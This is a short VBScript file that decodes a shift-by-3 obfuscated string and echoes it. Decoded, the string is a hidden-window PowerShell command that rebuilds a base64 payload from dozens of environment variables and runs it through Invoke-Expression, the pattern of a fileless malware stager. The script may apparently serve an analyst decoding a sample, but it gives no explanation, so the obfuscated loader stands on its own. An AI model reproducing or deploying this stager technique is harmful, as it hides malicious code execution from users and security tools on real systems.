' txt = "powershell -noexit"
txt = "srzhuvkhoo#0qrh{lw#0ZlqgrzVw|oh#Klgghq#0f#%Lh[#+^V|vwhp1Wh{w1Hqfrglqj`==DVFLL1JhwVwulqj+^v|vwhp1Frqyhuw`==IurpEdvh97Vwulqj+'hqy=[[[3.'hqy=[[[4.'hqy=[[[5.'hqy=[[[6.'hqy=[[[7.'hqy=[[[8.'hqy=[[[9.'hqy=[[[:.'hqy=[[[;.'hqy=[[[<.'hqy=[[[43.'hqy=[[[44.'hqy=[[[45.'hqy=[[[46.'hqy=[[[47.'hqy=[[[48.'hqy=[[[49.'hqy=[[[4:.'hqy=[[[4;.'hqy=[[[4<.'hqy=[[[53.'hqy=[[[54.'hqy=[[[55.'hqy=[[[56.'hqy=[[[57.'hqy=[[[58.'hqy=[[[59.'hqy=[[[5:.'hqy=[[[5;.'hqy=[[[5<.'hqy=[[[63.'hqy=[[[64.'hqy=[[[65.'hqy=[[[66.'hqy=[[[67.'hqy=[[[68.'hqy=[[[69.'hqy=[[[6:.'hqy=[[[6;.'hqy=[[[6<.'hqy=[[[73.'hqy=[[[74.'hqy=[[[75.'hqy=[[[76.'hqy=[[[77.'hqy=[[[78.'hqy=[[[79.'hqy=[[[7:.'hqy=[[[7;.'hqy=[[[7<.'hqy=[[[83.'hqy=[[[84.'hqy=[[[85.'hqy=[[[86.'hqy=[[[87.'hqy=[[[88.'hqy=[[[89.'hqy=[[[8:.'hqy=[[[8;.'hqy=[[[8<.'hqy=[[[93.'hqy=[[[94.'hqy=[[[95.'hqy=[[[96.'hqy=[[[97.'hqy=[[[98.'hqy=[[[99.'hqy=[[[9:.'hqy=[[[9;.'hqy=[[[9<.'hqy=[[[:3.'hqy=[[[:4.'hqy=[[[:5.'hqy=[[[:6.'hqy=[[[:7.'hqy=[[[:8.'hqy=[[[:9.'hqy=[[[::.'hqy=[[[:;.'hqy=[[[:<,,,>"
Wscript.echo decode(txt)

function decode(s)
    For i = 1 To Len(s)
        newtxt = Mid(s,i,1)
        newtxt = Chr(Asc(newtxt) - 3)
        coded = coded + (newtxt)
    Next
    decode = coded
End function